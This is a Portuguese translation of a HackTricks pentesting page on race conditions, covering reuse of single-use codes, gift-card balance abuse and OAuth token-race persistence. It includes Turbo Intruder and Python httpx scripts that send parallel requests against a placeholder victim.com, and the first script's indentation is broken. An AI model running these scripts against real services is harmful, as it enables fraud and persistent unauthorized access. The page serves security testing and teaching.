# CondiÃ§Ã£o de corrida

![](<../.gitbook/assets/image (9) (1) (2).png>)

Use o [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas da comunidade mais avanÃ§adas do mundo. Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Qualquer coisa limitada por um nÃºmero de tentativas

CondiÃ§Ãµes de corrida sÃ£o **vulnerabilidades** que **aparecem** em sites que **limitam o nÃºmero de vezes que vocÃª pode realizar uma aÃ§Ã£o**. Um exemplo muito fÃ¡cil pode ser encontrado neste [**relatÃ³rio**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43).

## Usando vÃ¡rias vezes um cÃ³digo de uso Ãºnico

Quando vocÃª faz a pÃ¡gina da web executar alguma **aÃ§Ã£o** que **deve ser feita apenas uma vez**, mas se a aÃ§Ã£o for feita **vÃ¡rias vezes**, vocÃª serÃ¡ **beneficiado**, vocÃª realmente precisa tentar uma **condiÃ§Ã£o de corrida**.\
Na maioria das vezes, isso estÃ¡ diretamente relacionado com **dinheiro** (se uma aÃ§Ã£o for realizada, vocÃª recebe X dinheiro, entÃ£o vamos tentar fazÃª-la vÃ¡rias vezes muito rapidamente)**.**

### **Usando da mesma conta o mesmo cÃ³digo vÃ¡rias vezes**

Por exemplo, neste [**bug**](https://hackerone.com/reports/759247), o caÃ§ador foi capaz de **carregar o dinheiro dentro de um cartÃ£o-presente vÃ¡rias vezes**.

Este Ã© o script **turbo intruder** usado para **testar** a **condiÃ§Ã£o de corrida** do relatÃ³rio mencionado:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
    engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
   engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
Usando tambÃ©m o BURP, vocÃª pode enviar a **requisiÃ§Ã£o** para o **Intruder**, definir o **nÃºmero de threads** para **30** dentro do menu **OpÃ§Ãµes** e selecionar como carga Ãºtil **Cargas Ãºteis nulas** e gerar **30**.

### **Usando o mesmo cÃ³digo de contas diferentes**

**Se a proposta anterior nÃ£o funcionar (tente usar o mesmo cÃ³digo vÃ¡rias vezes na mesma conta), vocÃª pode tentar uma variante: tente usar o mesmo cÃ³digo de contas diferentes:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
    for i in range(len(a)):
        engine.queue(target.req,a[i], gate='race1')
    # open TCP connections and send partial requests
    engine.start(timeout=10)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```
### Usando Python
```python
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20): #20 times
            tasks.append(asyncio.ensure_future(use_code(client)))
        
        # Get responses
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print results
        for r in results:
            print(r)
        
        # Async2sync sleep
        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())
```
## PersistÃªncia eterna do OAuth2

Existem vÃ¡rios [**provedores de OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Esses serviÃ§os permitirÃ£o que vocÃª crie um aplicativo e autentique usuÃ¡rios registrados pelo provedor. Para fazer isso, o **cliente** precisarÃ¡ **permitir que seu aplicativo** acesse alguns de seus dados dentro do **provedor de OAuth**.\
EntÃ£o, atÃ© aqui, apenas um login comum com google/linkdin/github... onde vocÃª Ã© solicitado com uma pÃ¡gina dizendo: "_O aplicativo \<InsertCoolName> deseja acessar suas informaÃ§Ãµes, vocÃª deseja permitir?_"

#### CondiÃ§Ã£o de corrida em `authorization_code`

O **problema** aparece quando vocÃª **aceita** e automaticamente envia um **`authorization_code`** para o aplicativo malicioso. Em seguida, este **aplicativo abusa de uma CondiÃ§Ã£o de Corrida no provedor de serviÃ§os de OAuth para gerar mais de um AT/RT** (_Token de AutenticaÃ§Ã£o/Token de AtualizaÃ§Ã£o_) a partir do **`authorization_code`** para sua conta. Basicamente, ele abusarÃ¡ do fato de vocÃª ter aceitado o aplicativo para acessar seus dados para **criar vÃ¡rias contas**. EntÃ£o, se vocÃª **parar de permitir que o aplicativo acesse seus dados, um par de AT/RT serÃ¡ excluÃ­do, mas os outros ainda serÃ£o vÃ¡lidos**.

#### CondiÃ§Ã£o de corrida em `Refresh Token`

Depois de **obter um RT vÃ¡lido**, vocÃª pode tentar **abusar dele para gerar vÃ¡rios AT/RT** e **mesmo se o usuÃ¡rio cancelar as permissÃµes** para o aplicativo malicioso acessar seus dados, **vÃ¡rios RTs ainda serÃ£o vÃ¡lidos.**

## ReferÃªncias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas dicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com facilidade, alimentados pelas ferramentas da comunidade **mais avanÃ§adas do mundo**.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
